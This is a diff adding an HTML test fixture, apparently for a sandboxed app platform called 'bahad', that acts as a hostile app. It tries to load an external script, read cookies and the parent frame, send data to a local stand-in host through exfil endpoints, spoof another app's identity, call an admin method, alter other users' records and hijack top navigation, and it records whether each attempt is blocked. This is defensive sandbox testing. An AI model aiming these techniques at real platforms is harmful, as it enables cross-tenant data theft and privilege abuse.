@@ -1,0 +1,71 @@
+<!doctype html>
+<html lang="he" dir="rtl">
+<head>
+  <meta charset="utf-8" />
+  <title>evil</title>
+  <script src="/bahad.js"></script>
+  <!-- external script: must be blocked by CSP (script-src 'self') -->
+  <script src="http://127.0.0.1:3299/evil-script.js"></script>
+</head>
+<body>
+  <h1>evil</h1>
+  <pre id="results">running</pre>
+  <script>
+    const OUT = "http://127.0.0.1:3299";
+    const results = {};
+    const params = new URLSearchParams(location.search);
+    function rawCall(method, params, extra) {
+      return new Promise((resolve) => {
+        const id = "raw-" + Math.random().toString(36).slice(2);
+        const onMsg = (e) => {
+          if (e.data && e.data.id === id) { removeEventListener("message", onMsg); resolve(e.data); }
+        };
+        addEventListener("message", onMsg);
+        parent.postMessage(Object.assign({ __bahad: 1, v: 1, id, method, params }, extra || {}), "*");
+        setTimeout(() => resolve({ timeout: true }), 8000);
+      });
+    }
+    async function attempt(name, fn) {
+      try { const v = await fn(); results[name] = { blocked: false, detail: String(JSON.stringify(v)).slice(0, 200) }; }
+      catch (e) { results[name] = { blocked: true, detail: String(e && (e.name + ": " + e.message)).slice(0, 200) }; }
+    }
+    (async () => {
+      results.inPortal = window.parent !== window;
+      results.isMock = bahad.isMock;
+      await attempt("readCookies", () => document.cookie);
+      await attempt("localStorage", () => window.localStorage.getItem("x"));
+      await attempt("parentDocument", () => window.parent.document.title);
+      await attempt("parentLocation", () => window.parent.location.href);
+      await attempt("fetchExternal", () => fetch(OUT + "/exfil-fetch?c=" + encodeURIComponent(document.title)).then((r) => r.status));
+      await attempt("imageExternal", () => new Promise((res, rej) => { const i = new Image(); i.onload = () => res("loaded"); i.onerror = () => rej(new Error("img blocked")); i.src = OUT + "/exfil-img"; }));
+      await attempt("beacon", () => { const ok = navigator.sendBeacon(OUT + "/exfil-beacon", "x"); if (!ok) throw new Error("beacon refused"); return ok; });
+      await attempt("apiDirect", async () => {
+        const r = await fetch("/api/platform/call", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ app: "hello-simple", method: "user.me", params: {} }) });
+        if (!r.ok) throw new Error("HTTP " + r.status);
+        return r.json();
+      });
+      // Claim another app's identity: the host must ignore "app" and use evil-app (which has no "notes" collection).
+      const claim = await rawCall("data.list", { collection: "notes" }, { app: "hello-simple", slug: "hello-simple" });
+      results.claimOtherApp = { blocked: !!(claim.error && claim.error.code === "not_found"), detail: JSON.stringify(claim).slice(0, 200) };
+      // Unknown / host-internal method
+      const unknown = await rawCall("admin.approve", { id: "x" });
+      results.unknownMethod = { blocked: !!(unknown.error && unknown.error.code === "invalid"), detail: JSON.stringify(unknown).slice(0, 200) };
+      // Data: write own secret, then try to read someone else's (target id passed by the test in the URL hash).
+      await bahad.ready();
+      const me = await bahad.user.me();
+      results.me = { id: me.id, keys: Object.keys(me).sort() };
+      const secrets = bahad.data.collection("secrets");
+      if (params.get("write")) await secrets.add({ who: params.get("write") });
+      const list = await secrets.list({ limit: 200 });
+      results.listedOwners = [...new Set(list.map((r) => r.data.who))];
+      if (params.get("target")) await attempt("getOthersRecord", () => secrets.get(params.get("target")));
+      if (params.get("target")) await attempt("updateOthersRecord", () => secrets.update(params.get("target"), { who: "hacked" }));
+      if (params.get("target")) await attempt("removeOthersRecord", () => secrets.remove(params.get("target")));
+      // (only meaningful inside the portal: a top-level page may of course navigate itself)
+      if (results.inPortal) await attempt("topNavigation", () => { top.location.href = "/profile?hijacked=1"; return "navigated?"; });
+      document.getElementById("results").textContent = JSON.stringify(results);
+      document.body.dataset.done = "1";
+    })().catch((e) => { document.getElementById("results").textContent = "CRASH " + e.message; document.body.dataset.done = "1"; });
+  </script>
+</body>
+</html>
